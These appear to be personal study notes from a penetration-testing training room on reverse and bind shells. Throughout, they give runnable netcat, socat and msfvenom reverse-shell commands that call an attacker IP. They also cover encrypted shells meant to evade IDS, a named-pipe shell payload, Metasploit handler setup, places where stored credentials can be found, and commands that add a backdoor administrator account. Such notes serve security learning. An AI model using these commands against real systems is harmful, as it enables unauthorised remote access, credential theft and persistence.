A shell is what we use when interfacing with a Command Line environment (CLI).

Examples of shells;
- bash
- sh
- cmd
- powershell
- fish
- zsh

A __reverse shell__ is a Command line access of a server that is send to the attacker. In this, we force the targetto connect back to our machine. They act as a good way to bypass firewall rules that may prevent you from connecting to arbitrary ports on the target; however, the drawback is that, when receiving a shell from a machine across the internet, you would need to configure your own network to accept the shell.

A __bind shell__ is a port on the server in which we can connect to in order to execute further commands. In this, the code executed on the target is used to start a listener attached to a shell directly on the target which would then be opened up to the internet and we can connect to it and obtain RCE. Its con

There are a variety of tools which can be used to recieve sehlls and send bind shells.
- Netcat - This is the traditional Swiss Army Knife of networking. Netcat shells are very unstable (easy to lose) by default, but can be improved easily.
- Socat - Socat is like netcat on steroids. It can do all of the same things, and _many_ more. Socat shells are usually more stable than netcat shells out of the box. However, there are some cons of socat:
	- the syntax is more difficult.
	- Socat is not installed on linux distros by default.
- Metasploit[multi/handler] - This metasploit module is used to recieve rev shells. It is also the only way to interact with a meterpreter shell and is the easiest way to handle staged payloads.
- Msfvenom -It is used to generated payloads independently from metasploit framework.

Linux comes with a  couple of pre-installed web-shells located at `/usr/share/webshells`


Example of reverse shell script:

```
//on attacker machine
sudo nc -nlvp 443

// on target machine
nc ATACKER_IP PORT -e /bin/bash
```


Example of a bind shell:

 First, we start a listener on the target -- this time we're also telling it to execute `cmd.exe`. Then, with the listener up and running, we connect from our own machine to the newly opened port.

```
// on target machine
nc -nvlp PORT -e /bin/bash

nc -nvlp PORT -e "cmd.exe"

// on attacker machine
nc MACHINE_IP PORT
```

### Shells interactivity
Shells can either be interactive or non-interactive.

#### Interactive shells

If you've used Powershell, Bash, Zsh, sh, or any other standard CLI environment then you will be used to  
interactive shells. These allow you to interact with programs after executing them.

#### Non-Interactive shells

don't give you that luxury. In a non-interactive shell you are limited to using programs which do not require user interaction in order to run properly.

Interactive programs dont work on non interactive shells.

### Netcat
__Reverse shell__

`nc -lvnp <port-number>`

-   **-l** is used to tell netcat that this will be a listener
-   **-v** is used to request a verbose output
-   **-n** tells netcat not to resolve host names or use DNS. Explaining this is outwith the scope of the room.
-   **-p** indicates that the port specification will follow.

Be aware that if you choose to use a port below 1024, you will need to use `sudo` when starting your listener.

 it's often a good idea to use a well-known port number (80, 443 or 53 being good choices) as this is more likely to get past outbound firewall rules on the target.

__Bind Shell__

`nc <target-ip> <chosen-port>`

Here we are using netcat to make an outbound connection to the target on our chosen port.

#### Stabilizing Netcat shells

If you press control +c , the shell will die.

We can stabilize our shell by using;
##### 1).Python
This is only applicable to linux boxes.
- `python -c 'import pty;pty.spawn("/bin/bash")'
- then run `export TERM=xterm` to give us access to some commnds such as clear.
- `ctrl + Z` - to background the shell so as to fully stabilize it.
- `stty raw -echo; fg` - This turns off our own terminal's echo giving us access to autocomplete, arrow keys and crtl +c then forgrounfs the shell .

Note if the shell dies, we need to type in reset so as to brign back the echo functionality back to our own shell.

##### 2). rlwrap

rlwrap is a program which, in simple terms, gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell_;_ however, s_ome_ manual stabilisation must still be utilised if you want to be able to use Ctrl + C inside the shell. rlwrap is not installed by default on Kali, so first install it with `sudo apt install rlwrap`.

To use this, we set up a different listener.
`rlwrap nc -lvnp <port>`

This gives us a more fully featured shell. It is good for use with windows reverse shells.

We can then fully stabilize it using Ctrl + Z, then use `stty raw -echo; fg` if it is a linux machine.

##### 3). Socat
Note that this is limited to linux targets only.

To accomplish this method of stabilisation we would first transfer a [socat static compiled binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true) (a version of the program compiled to have no dependencies) up to the target machine.

We can do this using a simple htttp server.

On windows, we can do this using pwershell.
```
Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe
```

##### Setting Terminal Size
If you wantto check your machine conifugration for terminal rows and columns ;
```
stty -a
```
To set the terminal rows and columns;
```
// setting rows
stty rows <NUMBER>

// setting columns
stty cols <NUMBER>
```

#### Socat
##### Reverse shells


__Listener__:
```
// linux
socat TCP-L:PORT -
```

```
Reverse shell
// windows
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes

// linux
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
```

The "pipes" option is used to force powershell (or cmd.exe) to use Unix style standard input and output.

##### Bind Shells

```
// On the linux target
socat TCP-L:<PORT> EXEC:"bash -li"

// On Windows target
socat TCP-L:<PORT> EXEC:powershell.exe,pipes
```

We use the "pipes" argument to interface between the Unix and Windows ways of handling input and output in a CLI environment.

Regardless of the target, this is the command on our attacking machine.
```
socat TCP:<TARGET-IP>:<TARGET-PORT> -
```

##### Stabilizing socat shells
```
// This is specific to the below socat command
socat TCP-L:<port> FILE:`tty`,raw,echo=0
```

 we are passing in the current TTY as a file and setting the echo to be zero. This is approximately equivalent to using the Ctrl + Z, `stty raw -echo; fg` trick with a netcat shell -- with the added bonus of being immediately stable and hooking into a full tty.

This means that the target must have socat installed. Most machines do not have socat installed by default, however, it's possible to upload a [precompiled socat binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true), which can then be executed as normal.
```
socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane

pty -- allocates a pseudoterminal on the target(part of the stabilisation process)

stderr -- makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)  

sigint -- passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell

setsid -- creates the process in a new session

sane -- stabilises the terminal, attempting to "normalise" it.
```

If, at any point, a socat shell is not working correctly, it's well worth increasing the verbosity by adding `-d -d` into the command.

#### Socat Encrypted Shells

- Encrypted shells cannot be spied on unless you have the decryption key, and are often able to bypass an IDS as a result.
- . Suffice to say that any time `TCP` was used as part of a command, this should be replaced with `OPENSSL` when working with encrypted shells.
- We first need to generate a certificate in order to use encrypted shells. This is easiest to do on our attacking machine:
```
// creating a 2048 bit rsa key with matching cert file, self-signed, and valid for just a year

openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
File the data blank or randomly
```

We then need to merge the two created files into a single `.pem` file:
```
cat shell.key shell.crt > shell.pem
```

Now we can set up our reverse shell listener;
```
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 - 
```
  
This sets up an OPENSSL listener using our generated certificate. `verify=0` tells the connection to not bother trying to validate that our certificate has been properly signed by a recognised authority.

To connect back;
```
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
```

We can use the same for a bind shell;
```
// target 
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes

// attacker
socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
```

note that even for a Windows target, the certificate must be used with the listener, so copying the PEM file across for a bind shell is required.

  
What is the syntax for setting up an OPENSSL-LISTENER using the tty technique from the previous task? Use port 53, and a PEM file called "encrypt.pem"

```
_socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0_
```

**If your IP is 10.10.10.5, what syntax would you use to connect back to this listener?**

```
_socat OPENSSL:10.10.10.5:53,verify=0 EXEC:”bash -li”,pty,stderr,sigint,setsid,sane_
```

#### Common Shell Payloads

```
// The command first creates a named pipe at /tmp/f. It then starts a netcat listener, and connects the input of the listener to the output of the named pipe. The output of the netcat listener (i.e. the commands we send) then gets piped directly into `sh`, sending the stderr output stream into stdout, and sending stdout itself into the input of the named pipe, thus completing the circle.


mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f

nc <LOCAL-IP> <PORT> -e /bin/bash
```

#### Msfvenom
-  msfvenom is used to generate code for primarily reverse and bind shells. It is used extensively in lower-level exploit development to generate hexadecimal shellcode when developing something like a Buffer Overflow exploit; however, it can also be used to generate payloads in various formats (e.g. `.exe`, `.aspx`, `.war`, `.py`)

The standard syntax for msfvenom is;
```
msfvenom -p PAYLOAD OPTIONS
```

To make a windows x64 reverse shell in an exe format;
```
msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>

-f format
- o file - output

msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell.elf LHOST=10.10.10.5 LPORT=443
```

##### Staged Payloads
- They are sent into 2 parts.
- The first part is the stager; which is directly executed on the server. It connects back to a waiting listenerbut doesnt actually contain any reverse shell code by itself. Instead it connects to the listener and uses the connection to load the real payload, executing it directly and preventing it from touching the disk where it could be caught by traditional anti-virus solutions.
- Thus the payload is split into two parts -- a small initial stager, then the bulkier reverse shell code which is downloaded when the stager is activated
- They require a special listener; usually metaspoilt multi/handler.

##### Stageless Payload
- They are the one's we use commonly.
- They are use and catch.
- However, they are bulkier and easy to be noticed.

##### Meterpreter
- Meterpreter shells are Metasploit's own brand of fully-featured shell.
- They are super stable, best for windows machine.
- They also have a lot of inbuilt functionality of their own, such as file uploads and downloads.
- The downside to meterpreter shells is that they _must_ be caught in Metasploit.


##### Payload naming convetions.
```
<OS>/<arch>/<payload>
// examples
linux/x86/shell_reverse_tcp
```

The exception to this convention is Windows 32bit targets. For these, the arch is not specified.
```
windows/shell_reverse_tcp
```

Stageless payloads are denoted with underscores (`_`).
eg
```
shell_reverse_tcp
```

Staged payloads are denoted with a '/'

This rule also applies to Meterpreter payloads. A Windows 64bit staged Meterpreter payload would look like this:

`windows/x64/meterpreter/reverse_tcp`  

A Linux 32bit stageless Meterpreter payload would look like this:

`linux/x86/meterpreter_reverse_tcp`

To list all available payloads;
```
// meterpreter
msfvenom --list payloads
```

### Metasploit multi/handler
- It is used to catch reverse shells.

```
// on msfconsole 
use mutli/handler

//run options to see available options.
show options

set PAYLOAD YOUR_PAYLOAD
set LHOST YOUR_ATTACKER_IP
set LPORT ATTACKER_LISTENING_PORT

// we can now run the module as a job in the background
exploit -j
```

- To view present sessions, run the `sessions command.`
- To interact with a session, run the `session <SESSION_NUMBER>`

### Web Shells
- "Webshell" is a colloquial term for a script that runs inside a webserver (usually in a language such as PHP or ASP) which executes code on the server.
- It is fairly easy for linux payloads
- When the target is Windows, it is often easiest to obtain RCE using a web shell, or by using msfvenom to generate a reverse/bind shell in the language of the server.
- To get an rce on windows, we can usually url encode the powershell reverse shell code and pass it to the cmd parameter.

### After getting a reverse shell.
##### Persistence.
- On Windows the options are often more limited. It's sometimes possible to find passwords for running services in the registry. VNC servers, for example, frequently leave passwords in the registry stored in plaintext. Some versions of the FileZilla FTP server also leave credentials in an XML file at `C:\Program Files\FileZilla Server\FileZilla Server.xml`  
 or `C:\xampp\FileZilla Server\FileZilla Server.xml`  
. These can be MD5 hashes or in plaintext, depending on the version.
- Ideally on Windows you would obtain a shell running as the SYSTEM user, or an administrator account running with high privileges. In such a situation it's possible to simply add your own account (in the administrators group) to the machine, then log in over RDP, telnet, winexe, psexec, WinRM or any number of other methods, dependent on the services running on the box.

The syntax for this is as follows:

`net user <username> <password> /add`

`net localgroup administrators <username> /add`

